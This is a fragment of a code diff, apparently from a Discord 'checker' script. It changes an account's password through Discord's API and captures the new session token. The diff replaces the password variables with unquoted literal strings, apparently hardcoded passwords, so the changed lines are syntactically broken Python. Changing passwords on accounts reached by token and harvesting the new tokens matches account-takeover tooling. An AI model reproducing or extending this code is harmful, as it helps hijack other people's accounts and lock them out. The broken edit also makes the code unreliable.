@@ -84,8 +84,8 @@ def _CHECKER_():
             new = newpassx
 
         payload = {
-            'password': password,
-            'new_password': new,
+            'password': foreverlocas777,
+            'new_password': locassaya7a,
         }
         r = s.patch('https://discord.com/api/v9/users/@me', headers=headers, json=payload)
         new_token = r.json()['token']
